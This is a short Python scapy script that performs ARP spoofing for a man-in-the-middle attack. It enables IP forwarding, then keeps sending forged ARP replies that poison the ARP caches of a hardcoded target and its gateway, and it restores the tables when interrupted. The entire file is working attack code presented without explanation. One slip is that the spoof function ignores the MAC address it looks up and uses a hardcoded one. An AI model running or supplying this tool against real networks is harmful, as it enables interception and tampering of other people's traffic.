#!/bin/python

import scapy.all as scapy 
import time
import subprocess


targetip = '172.16.100.23'
spoofip = '172.16.100.1'



# packet forwarding needs to be allowed attacker machine 
def allow_ip_forwarding():
    cmd = 'echo 1 > /proc/sys/net/ipv4/ip_forward'
    subprocess.check_output(cmd, shell=True)


def Getmac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast =  scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list,unaswered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)
    res = answered_list[0][1].hwsrc
    return res


def spoof(target_ip,spoof_ip):
    target_mac=Getmac(target_ip)
    packet = scapy.ARP(op=2 , pdst=target_ip , hwdst='08-00-27-A9-E4-31' , psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(dest_ip ,src_ip):
    dest_mac = Getmac(dest_ip)
    src_mac =  Getmac(src_ip)
    restore_packet = scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=src_ip,hwsrc=src_mac)
    scapy.send(restore_packet,count=4)


packet_Counter=0
try :
    while True:
        allow_ip_forwarding()
        spoof(targetip,spoofip)
        spoof(spoofip,targetip)
        packet_Counter+=2
        print(f'\r Packets sent : {str(packet_Counter)} ',end='')
        time.sleep(2)

except KeyboardInterrupt:
    print("Detected CTRL + C ---> Restoring the ARP table ")
    restore(targetip,spoofip)

